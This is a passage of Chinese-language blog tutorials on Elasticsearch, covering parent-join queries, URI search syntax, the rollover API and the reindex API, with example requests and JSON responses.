&#125;&#125;我们通过查询parent_id，返回所有parent_id为1的所有answer类型的文档：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 2, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.35667494, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;my_index&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;4&quot;, &quot;_score&quot; : 0.35667494, &quot;_routing&quot; : &quot;1&quot;, &quot;_source&quot; : &#123; &quot;text&quot; : &quot;This is another answer&quot;, &quot;my_join_field&quot; : &#123; &quot;name&quot; : &quot;answer&quot;, &quot;parent&quot; : &quot;1&quot; &#125; &#125; &#125;, &#123; &quot;_index&quot; : &quot;my_index&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;3&quot;, &quot;_score&quot; : 0.35667494, &quot;_routing&quot; : &quot;1&quot;, &quot;_source&quot; : &#123; &quot;text&quot; : &quot;This is an answer&quot;, &quot;my_join_field&quot; : &#123; &quot;name&quot; : &quot;answer&quot;, &quot;parent&quot; : &quot;1&quot; &#125; &#125; &#125; ] &#125;&#125;在这里，我们可以看到返回id为3和4的文档。我们也可以对这些文档进行aggregation:123456789101112131415161718192021222324GET my_index/_search&#123; &quot;query&quot;: &#123; &quot;parent_id&quot;: &#123; &quot;type&quot;: &quot;answer&quot;, &quot;id&quot;: &quot;1&quot; &#125; &#125;, &quot;aggs&quot;: &#123; &quot;parents&quot;: &#123; &quot;terms&quot;: &#123; &quot;field&quot;: &quot;my_join_field#question&quot;, &quot;size&quot;: 10 &#125; &#125; &#125;, &quot;script_fields&quot;: &#123; &quot;parent&quot;: &#123; &quot;script&quot;: &#123; &quot;source&quot;: &quot;doc[&apos;my_join_field#question&apos;]&quot; &#125; &#125; &#125;&#125;就像我们在上一节中介绍的那样， 在我们的应用实例中，在index时，它也创建一个额外的一个字段，虽然在source里我们看不到。这个字段就是my_join_filed#question，这个字段含有parent _id。在上面的查询中，我们首先查询所有的parent_id为1的所有的answer类型的文档。接下来对所有的文档以parent_id进行聚合：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 2, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.35667494, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;my_index&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;4&quot;, &quot;_score&quot; : 0.35667494, &quot;_routing&quot; : &quot;1&quot;, &quot;fields&quot; : &#123; &quot;parent&quot; : [ &quot;1&quot; ] &#125; &#125;, &#123; &quot;_index&quot; : &quot;my_index&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;3&quot;, &quot;_score&quot; : 0.35667494, &quot;_routing&quot; : &quot;1&quot;, &quot;fields&quot; : &#123; &quot;parent&quot; : [ &quot;1&quot; ] &#125; &#125; ] &#125;, &quot;aggregations&quot; : &#123; &quot;parents&quot; : &#123; &quot;doc_count_error_upper_bound&quot; : 0, &quot;sum_other_doc_count&quot; : 0, &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;1&quot;, &quot;doc_count&quot; : 2 &#125; ] &#125; &#125;&#125;一个parent对应多个child对于一个parent来说，我们可以定义多个child，比如：12345678910111213PUT my_index&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;my_join_field&quot;: &#123; &quot;type&quot;: &quot;join&quot;, &quot;relations&quot;: &#123; &quot;question&quot;: [&quot;answer&quot;, &quot;comment&quot;] &#125; &#125; &#125; &#125;&#125;在这里，question是answer及comment的parent。多层的parent join虽然这个不建议，这样做可能会可能在query时带来更多的内存及计算方面的开销：1234567891011121314PUT my_index&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;my_join_field&quot;: &#123; &quot;type&quot;: &quot;join&quot;, &quot;relations&quot;: &#123; &quot;question&quot;: [&quot;answer&quot;, &quot;comment&quot;], &quot;answer&quot;: &quot;vote&quot; &#125; &#125; &#125; &#125;&#125;这里question是answer及comment的parent，同时answer也是vote的parent。它表明了如下的关系：索引grandchild文档需routing值等于grand-parent（谱系里的更大parent）：12345678PUT my_index/_doc/3?routing=1&amp;refresh &#123; &quot;text&quot;: &quot;This is a vote&quot;, &quot;my_join_field&quot;: &#123; &quot;name&quot;: &quot;vote&quot;, &quot;parent&quot;: &quot;2&quot; &#125;&#125;这个child文档必须是和他的grand-parent在一个shard里。在这里它使用了1，也即question的id。同时，对于vote来说，它的parent必须是它的parent，也即answer的id。更多参考：https://www.elastic.co/guide/en/elasticsearch/reference/7.3/parent-join.html]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch 使用URI Search]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%20%E4%BD%BF%E7%94%A8URI%20Search%2F</url>
    <content type="text"><![CDATA[在Elasticsearch中，我们可以使用_search终端进行搜索。这个在我之前的文章 “开始使用Elasticsearch （2）” 中有很多的描述。针对这种搜索，我们可以使用强大的DSL进行搜索。在Elasticsearch中，还有一类是基于URI的搜索。对于这种它可以很方便地直接在浏览器中的地址栏或命令行中直接使用。 使用此模式执行搜索时，并非所有搜索选项都公开，但是对于快速的“curl tests”来说，它可能很方便。在今天的文章中，我们来做一个简单的描述。同时我需要指出来的是，这里的语法和Kibana中的Search Bar搜索语法是一样的。安装Elastic Stack准备好数据为了说明问题的方便，我们首先在Kibana中使用如下的bulk指令来创建我们的twitter索引。12345678910111213POST _bulk&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 1&#125; &#125;&#123;&quot;user&quot;:&quot;张三&quot;,&quot;message&quot;:&quot;今儿天气不错啊，出去转转去&quot;,&quot;uid&quot;:2,&quot;age&quot;:20,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市海淀区&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.970718&quot;,&quot;lon&quot;:&quot;116.325747&quot;&#125;, &quot;DOB&quot;:&quot;1980-12-01&quot;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 2 &#125;&#125;&#123;&quot;user&quot;:&quot;老刘&quot;,&quot;message&quot;:&quot;出发，下一站云南！&quot;,&quot;uid&quot;:3,&quot;age&quot;:30,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市东城区台基厂三条3号&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.904313&quot;,&quot;lon&quot;:&quot;116.412754&quot;&#125;, &quot;DOB&quot;:&quot;1981-12-01&quot;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 3&#125; &#125;&#123;&quot;user&quot;:&quot;李四&quot;,&quot;message&quot;:&quot;happy birthday!&quot;,&quot;uid&quot;:4,&quot;age&quot;:30,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市东城区&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.893801&quot;,&quot;lon&quot;:&quot;116.408986&quot;&#125;, &quot;DOB&quot;:&quot;1982-12-01&quot;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 4&#125; &#125;&#123;&quot;user&quot;:&quot;老贾&quot;,&quot;message&quot;:&quot;123,gogogo&quot;,&quot;uid&quot;:5,&quot;age&quot;:35,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市朝阳区建国门&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.718256&quot;,&quot;lon&quot;:&quot;116.367910&quot;&#125;, &quot;DOB&quot;:&quot;1983-12-01&quot;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 5&#125; &#125;&#123;&quot;user&quot;:&quot;老王&quot;,&quot;message&quot;:&quot;Happy BirthDay My Friend!&quot;,&quot;uid&quot;:6,&quot;age&quot;:50,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市朝阳区国贸&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.918256&quot;,&quot;lon&quot;:&quot;116.467910&quot;&#125;, &quot;DOB&quot;:&quot;1984-12-01&quot;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 6&#125; &#125;&#123;&quot;user&quot;:&quot;老吴&quot;,&quot;message&quot;:&quot;好友来了都今天我生日，好友来了,什么 birthday happy 就成!&quot;,&quot;uid&quot;:7,&quot;age&quot;:90,&quot;city&quot;:&quot;上海&quot;,&quot;province&quot;:&quot;上海&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国上海市闵行区&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;31.175927&quot;,&quot;lon&quot;:&quot;121.383328&quot;&#125;, &quot;DOB&quot;:&quot;1985-12-01&quot;&#125;这里总共有6条数据。下面，我们来进行一些查询的动作。搜索数据首先，我们做一个简单的搜索，我们可以在浏览器中打入如下的命令：1GET twitter/_search?q=user:张三我们通过 “q=user:张三” 查询到我们所需要的文档。在有的时候这是一种非常快的查询方式。我们也可以在浏览器中直接打入一个这样的URI:1http://localhost:9200/_search?q=user:%E5%BC%A0%E4%B8%89&amp;pretty或者在命令行中：下面，我们将使用Kibana来展示使用URI搜索的一些最基本的特点。URI查询使用语法根据运算符（例如OR，AND或NOT）解析和拆分提供的查询字符串我们想使用sort来对数据进行排序：1GET twitter/_search?q=city:&quot;北京&quot;&amp;sort=DOB:desc上面显示了所有来自北京的用户，并按照出生年月降序排列。假如我们只想在_source里显示年龄，DOB及城市信息，我们可以这么做：1GET twitter/_search?q=city:&quot;北京&quot;&amp;sort=DOB:desc&amp;_source=city,age,DOB从上面的显示可以看出来，我们只看到有三个字段显示出来。加入我们想分页，每个页只有2个文档，那么我们可以这么做：1GET twitter/_search?q=city:&quot;北京&quot;&amp;sort=DOB:desc&amp;_source=city,age,DOB&amp;size=2从上面的显示上我们可以看出来，只有两个文档被显示出来尽管总共有5个文档满足条件。假如这个时候，我们想对city为“上海”和“北京”的所有用户都来统计一下，那么我们可以使用如下的语句：1GET twitter/_search?q=city:(&quot;北京&quot; or &quot;上海&quot;) &amp;sort=DOB:desc&amp;_source=city,age,DOB&amp;size=2显然这个时候，我们得到了6条数据。上海和北京的所有用户都被搜索出来了。假如我们想查询来自“北京”并且名字叫做“张三”的文档，那么我们可以这么查询：1GET twitter/_search?q=city:&quot;北京&quot; AND user:&quot;张三从上面可以看出来就只有一条数据。假如我们想得到来除了上海以外地区的所有的用户，那么我们可以使用如下的方法来得到：1GET twitter/_search?q=NOT city:&quot;上海&quot;我们看到了5个数据。我们也可以对某些想进行加权，以使得它们能够排在更前面，比如：上面的查询是寻找年龄是20岁的，或者是来自上海的人。从搜索的结果来看，我们可以看到上海的老吴是排在前面。如果我们想对年龄为20岁的人需要有更多的关注，那么我们可以对它们的搜索结果进行加权，这样会使得它们的分数更高。我们可以采用如下的方法来做：1GET twitter/_search?q=(age:20^5 OR city:&quot;上海&quot;)在上面，我们显然对age为20的这个选项进行了加权。那么搜索后的结果为：我们可以看到现在age为20岁的张三排到了搜索结果的前面。假如我们不指定任何的field的话，那么这个搜索将对所有的field都进行：1GET twitter/_search?q=张三当然我们也可以进行fuzzy搜索：上面标明有一个edit错误也可以被搜索出来。对于中文的检索，这个依赖于分词器。在我们的实验中没有使用具体的分词器。这个和实际的使用可能会有区别。我们也可以对一下范围进行搜索：1GET twitter/_search?q=age:[20 TO 30]上面搜索的结果是从20岁到30岁的所有的结果，并且都包含在里面。我们如果不想包含30岁的话，那么可以写成这样的格式：我们使用[20 TO 30}， 如果我们想搜索在30岁一下的所有文档，那么我们可以使用如下的搜索方式：在这里，我们使用[* TO 30}，这里不包含30。好了今天就讲到这里。这里的所有的语法也适用于在Kibana中的Search Bar。如果我们熟练地掌握了这些，也可以很方便地让我们熟练地操作Kibana中搜索。参考：【1】https://www.elastic.co/guide/en/elasticsearch/reference/current/query-filter-context.html【2】https://www.elastic.co/guide/en/elasticsearch/reference/7.4/search-uri-request.html]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch rollover API]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%20rollover%20API%2F</url>
    <content type="text"><![CDATA[rollover使您可以根据索引大小，文档数或使用期限自动过渡到新索引。 当rollover触发后，将创建新索引，写别名（write alias)将更新为指向新索引，所有后续更新都将写入新索引。对于基于时间的rollover来说，基于大小，文档数或使用期限过渡至新索引是比较适合的。 在任意时间rollover通常会导致许多小的索引，这可能会对性能和资源使用产生负面影响。Rollover历史数据在大多数情况下，无限期保留历史数据是不可行的时间序列数据随着时间的流逝而失去价值，我们最终不得不将其删除但是其中一些数据对于分析仍然非常有用Elasticsearch 6.3引入了一项新的rollover功能，该功能以紧凑的聚合格式保存旧数据仅保存您感兴趣的数据就像上面的图片看到的那样，我们定义了一个叫做logs-alias的alias，对于写操作来说，它总是会自动指向最新的可以用于写入index的一个索引。针对我们上面的情况，它指向logs-000002。如果新的rollover发生后，新的logs-000003将被生成，并对于写操作来说，它自动指向最新生产的logs-000003索引。而对于读写操作来说，它将同时指向最先的logs-1，logs-000002及logs-000003。在这里我们需要注意的是：在我们最早设定index名字时，最后的一个字符必须是数字，比如我们上面显示的logs-1。否则，自动生产index将会失败。rollover例子我们还是先拿一个rollover的例子来说明，这样比较清楚。首先我们定义一个log-alias的alias:12345678PUT /%3Clogs-%7Bnow%2Fd%7D-1%3E&#123; &quot;aliases&quot;: &#123; &quot;log_alias&quot;: &#123; &quot;is_write_index&quot;: true &#125; &#125;&#125;如果大家对于上面的字符串“%3Clogs-%7Bnow%2Fd%7D-1%3E”比较陌生的话，可以参考网站https://www.urlencoder.io/。实际上它就是字符串“&lt;logs-{now/d}-1&gt;”的url编码形式。请注意上面的is_write_index必须设置为true。运行上面的结果是：12345&#123; &quot;acknowledged&quot; : true, &quot;shards_acknowledged&quot; : true, &quot;index&quot; : &quot;logs-2019.10.21-1&quot;&#125;显然，它帮我们生产了一个叫做logs-2019.10.21-1的index。接下来，我们先使用我们的Kibana来准备一下我们的index数据。我们运行起来我们的Kibana:我们分别点击上面的1和2处：点击上面的“Add data”。这样我们就可以把我们的kibana_sample_data_logs索引加载到Elasticsearch中。我们可以通过如下的命令进行查看：1GET _cat/indices/kibana_sample_data_logs命令显示结果为：它显示kibana_sample_data_logs具有11.1M的数据，并且它有14074个文档：我们接下来运行如下的命令：123456789POST _reindex&#123; &quot;source&quot;: &#123; &quot;index&quot;: &quot;kibana_sample_data_logs&quot; &#125;, &quot;dest&quot;: &#123; &quot;index&quot;: &quot;log_alias&quot; &#125;&#125;这个命令的作用是把kibana_sample_data_logs里的数据reindex到log_alias所指向的index。也就是把kibana_sample_data_logs的文档复制一份到我们上面显示的logs-2019.10.21-1索引里。我们做如下的操作查看一下结果：1GET logs-2019.10.21-1/_count显示的结果是：123456789&#123; &quot;count&quot; : 14074, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;&#125;显然，我们已经复制到所有的数据。那么接下来，我们来运行如下的一个指令：12345678POST /log_alias/_rollover?dry_run&#123; &quot;conditions&quot;: &#123; &quot;max_age&quot;: &quot;7d&quot;, &quot;max_docs&quot;: 14000, &quot;max_size&quot;: &quot;5gb&quot; &#125;&#125;在这里，我们定义了三个条件：如果时间超过7天，那么自动rollover，也就是使用新的index如果文档的数目超过14000个，那么自动rollover如果index的大小超过5G，那么自动rollover在上面我们使用了dry_run参数，表明就是运行时看看，但不是真正地实施。显示的结果是：12345678910111213&#123; &quot;acknowledged&quot; : false, &quot;shards_acknowledged&quot; : false, &quot;old_index&quot; : &quot;logs-2019.10.21-1&quot;, &quot;new_index&quot; : &quot;logs-2019.10.21-000002&quot;, &quot;rolled_over&quot; : false, &quot;dry_run&quot; : true, &quot;conditions&quot; : &#123; &quot;[max_docs: 1400]&quot; : true, &quot;[max_size: 5gb]&quot; : false, &quot;[max_age: 7d]&quot; : false &#125;&#125;根据目前我们的条件，我们的logs-2019.10.21-1文档数已经超过14000个了，所以会生产新的索引logs-2019.10.21-000002。因为我使用了dry_run，也就是演习，所以显示的rolled_over是false。为了能真正地rollover，我们运行如下的命令：12345678POST /log_alias/_rollover&#123; &quot;conditions&quot;: &#123; &quot;max_age&quot;: &quot;7d&quot;, &quot;max_docs&quot;: 1400, &quot;max_size&quot;: &quot;5gb&quot; &#125;&#125;显示的结果是：12345678910111213&#123; &quot;acknowledged&quot; : true, &quot;shards_acknowledged&quot; : true, &quot;old_index&quot; : &quot;logs-2019.10.21-1&quot;, &quot;new_index&quot; : &quot;logs-2019.10.21-000002&quot;, &quot;rolled_over&quot; : true, &quot;dry_run&quot; : false, &quot;conditions&quot; : &#123; &quot;[max_docs: 1400]&quot; : true, &quot;[max_size: 5gb]&quot; : false, &quot;[max_age: 7d]&quot; : false &#125;&#125;说明它已经rolled_ovder了。我们可以通过如下写的命令来检查：1GET _cat/indices/logs-2019*显示的结果为：我们现在可以看到有两个以logs-2019.10.21为头的index，并且第二文档logs-2019.10.21-000002文档数为0。如果我们这个时候直接再想log_alias写入文档的话：1234567891011121314151617181920212223242526272829303132333435363738POST log_alias/_doc&#123; &quot;agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64; rv:6.0a1) Gecko/20110421 Firefox/6.0a1&quot;, &quot;bytes&quot;: 6219, &quot;clientip&quot;: &quot;223.87.60.27&quot;, &quot;extension&quot;: &quot;deb&quot;, &quot;geo&quot;: &#123; &quot;srcdest&quot;: &quot;IN:US&quot;, &quot;src&quot;: &quot;IN&quot;, &quot;dest&quot;: &quot;US&quot;, &quot;coordinates&quot;: &#123; &quot;lat&quot;: 39.41042861, &quot;lon&quot;: -88.8454325 &#125; &#125;, &quot;host&quot;: &quot;artifacts.elastic.co&quot;, &quot;index&quot;: &quot;kibana_sample_data_logs&quot;, &quot;ip&quot;: &quot;223.87.60.27&quot;, &quot;machine&quot;: &#123; &quot;ram&quot;: 8589934592, &quot;os&quot;: &quot;win 8&quot; &#125;, &quot;memory&quot;: null, &quot;message&quot;: &quot;&quot;&quot; 223.87.60.27 - - [2018-07-22T00:39:02.912Z] &quot;GET /elasticsearch/elasticsearch-6.3.2.deb_1 HTTP/1.1&quot; 200 6219 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:6.0a1) Gecko/20110421 Firefox/6.0a1&quot; &quot;&quot;&quot;, &quot;phpmemory&quot;: null, &quot;referer&quot;: &quot;http://twitter.com/success/wendy-lawrence&quot;, &quot;request&quot;: &quot;/elasticsearch/elasticsearch-6.3.2.deb&quot;, &quot;response&quot;: 200, &quot;tags&quot;: [ &quot;success&quot;, &quot;info&quot; ], &quot;timestamp&quot;: &quot;2019-10-13T00:39:02.912Z&quot;, &quot;url&quot;: &quot;https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.3.2.deb_1&quot;, &quot;utc_time&quot;: &quot;2019-10-13T00:39:02.912Z&quot;&#125;显示的结果：1234567891011121314&#123; &quot;_index&quot; : &quot;logs-2019.10.21-000002&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;xPyQ7m0BsjOKp1OsjsP8&quot;, &quot;_version&quot; : 1, &quot;result&quot; : &quot;created&quot;, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;failed&quot; : 0 &#125;, &quot;_seq_no&quot; : 1, &quot;_primary_term&quot; : 1&#125;显然它写入的是logs-2019.10.21-000002索引。我们再次查询log_alias的总共文档数：1GET log_alias/_count显示的结果是：123456789&#123; &quot;count&quot; : 14075, &quot;_shards&quot; : &#123; &quot;total&quot; : 2, &quot;successful&quot; : 2, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;&#125;显然它和之前的14074个文档多增加了一个文档，也就是说log_alias是同时指向logs-2019.10.21-1及logs-2019.10.21-000002。总结：在今天的文档里，我们讲述了如何使用rollover API来自动管理我们的index。利用rollover API，它可以很方便地帮我们自动根据我们设定的条件帮我们把我们的Index过度到新的index。在未来的文章里，我们将讲述如何使用Index life cycle policy来帮我们管理我们的index。]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch Reindex接口]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%20Reindex%E6%8E%A5%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[在我们开发的过程中，我们有很多时候需要用到Reindex接口。它可以帮我们把数据从一个index到另外一个index进行重新reindex。这个对于特别适用于我们在修改我们数据的mapping后，需要重新把数据从现有的index转到新的index建立新的索引，这是因为我们不能修改现有的index的mapping一旦已经定下来了。在接下来的介绍中，我们将学习如何使用reindex接口。为了能够使用reindex接口，我们必须满足一下的条件：_source选项对所有的源index文档是启动的，也即源index的source是被存储的reindex不是帮我们尝试设置好目的地index。它不拷贝源index的设置到目的地的index里去。你应该在做reindex之前把目的地的源的index设置好，这其中包括mapping, shard数目，replica等下面，我们来一个具体的例子，比如建立一个blogs的index。123456789101112131415PUT twitter2/_doc/1&#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市海淀区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125;&#125;上面的命令让我们建立了一个叫做twitter2的index，并同时帮我们生产了一个如下的mapping:1GET /twitter2/_mapping显示的结果是：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990&#123; &quot;twitter2&quot; : &#123; &quot;mappings&quot; : &#123; &quot;properties&quot; : &#123; &quot;address&quot; : &#123; &quot;type&quot; : &quot;text&quot;, &quot;fields&quot; : &#123; &quot;keyword&quot; : &#123; &quot;type&quot; : &quot;keyword&quot;, &quot;ignore_above&quot; : 256 &#125; &#125; &#125;, &quot;age&quot; : &#123; &quot;type&quot; : &quot;long&quot; &#125;, &quot;city&quot; : &#123; &quot;type&quot; : &quot;text&quot;, &quot;fields&quot; : &#123; &quot;keyword&quot; : &#123; &quot;type&quot; : &quot;keyword&quot;, &quot;ignore_above&quot; : 256 &#125; &#125; &#125;, &quot;country&quot; : &#123; &quot;type&quot; : &quot;text&quot;, &quot;fields&quot; : &#123; &quot;keyword&quot; : &#123; &quot;type&quot; : &quot;keyword&quot;, &quot;ignore_above&quot; : 256 &#125; &#125; &#125;, &quot;location&quot; : &#123; &quot;properties&quot; : &#123; &quot;lat&quot; : &#123; &quot;type&quot; : &quot;text&quot;, &quot;fields&quot; : &#123; &quot;keyword&quot; : &#123; &quot;type&quot; : &quot;keyword&quot;, &quot;ignore_above&quot; : 256 &#125; &#125; &#125;, &quot;lon&quot; : &#123; &quot;type&quot; : &quot;text&quot;, &quot;fields&quot; : &#123; &quot;keyword&quot; : &#123; &quot;type&quot; : &quot;keyword&quot;, &quot;ignore_above&quot; : 256 &#125; &#125; &#125; &#125; &#125;, &quot;message&quot; : &#123; &quot;type&quot; : &quot;text&quot;, &quot;fields&quot; : &#123; &quot;keyword&quot; : &#123; &quot;type&quot; : &quot;keyword&quot;, &quot;ignore_above&quot; : 256 &#125; &#125; &#125;, &quot;province&quot; : &#123; &quot;type&quot; : &quot;text&quot;, &quot;fields&quot; : &#123; &quot;keyword&quot; : &#123; &quot;type&quot; : &quot;keyword&quot;, &quot;ignore_above&quot; : 256 &#125; &#125; &#125;, &quot;uid&quot; : &#123; &quot;type&quot; : &quot;long&quot; &#125;, &quot;user&quot; : &#123; &quot;type&quot; : &quot;text&quot;, &quot;fields&quot; : &#123; &quot;keyword&quot; : &#123; &quot;type&quot; : &quot;keyword&quot;, &quot;ignore_above&quot; : 256 &#125; &#125; &#125; &#125; &#125; &#125;&#125;显然系统帮我们生产的location数据类型是不对的，我们必须进行修改。一种办法是删除现有的twitter2索引，让后修改它的mapping，再重新索引所有的数据。这对于一个两个文档还是可以的，但是如果已经有很多的数据了，这个方法并不可取。另外一种方式，是建立一个完全新的index，使用新的mapping进行reindex。下面我们展示如何使用这种方法。创建一个新的twitter3的index，使用如下的mapping:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950PUT twitter3&#123; &quot;settings&quot;: &#123; &quot;number_of_shards&quot;: 1, &quot;number_of_replicas&quot;: 1 &#125;, &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;address&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;age&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125;, &quot;city&quot;: &#123; &quot;type&quot;: &quot;text&quot; &#125;, &quot;country&quot;: &#123; &quot;type&quot;: &quot;text&quot; &#125;, &quot;location&quot;: &#123; &quot;type&quot;: &quot;geo_point&quot; &#125;, &quot;message&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;province&quot;: &#123; &quot;type&quot;: &quot;text&quot; &#125;, &quot;uid&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125;, &quot;user&quot;: &#123; &quot;type&quot;: &quot;text&quot; &#125; &#125; &#125;&#125;这里我们我们修改了location及其它的一些数据项的数据类型。运行上面的指令，我们就可以创建一个完全新的twitter3的index。我们可以通过如下的命令来进行reindex：123456789POST _reindex&#123; &quot;source&quot;: &#123; &quot;index&quot;: &quot;twitter2&quot; &#125;, &quot;dest&quot;: &#123; &quot;index&quot;: &quot;twitter3&quot; &#125;&#125;显示的结果是：12345678910111213141516171819&#123; &quot;took&quot; : 52, &quot;timed_out&quot; : false, &quot;total&quot; : 1, &quot;updated&quot; : 0, &quot;created&quot; : 1, &quot;deleted&quot; : 0, &quot;batches&quot; : 1, &quot;version_conflicts&quot; : 0, &quot;noops&quot; : 0, &quot;retries&quot; : &#123; &quot;bulk&quot; : 0, &quot;search&quot; : 0 &#125;, &quot;throttled_millis&quot; : 0, &quot;requests_per_second&quot; : -1.0, &quot;throttled_until_millis&quot; : 0, &quot;failures&quot; : [ ]&#125;我们可以通过如下的命令来检查我们的twitter3是否已经有新的数据：1GET /twitter3/_search显示的结果是：123456789101112131415161718192021222324252627282930313233343536373839&#123; &quot;took&quot; : 100, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 1.0, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;twitter3&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市海淀区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125; &#125; &#125; ] &#125;&#125;显然我们的数据已经从twitter2到twitter3，并且它的数据类型已经是完全符合我们要求的数据类型。Reindex执行Reindex是一个时间点的副本就像上面返回的结果显示的那样，它是以batch（批量）的方式来执行的。默认的批量大小为1000你也可以只拷贝源index其中的一部分数据通过加入query到source中通过定义max_docs参数比如：123456789101112131415POST _reindex&#123; &quot;max_docs&quot;: 100, &quot;source&quot;: &#123; 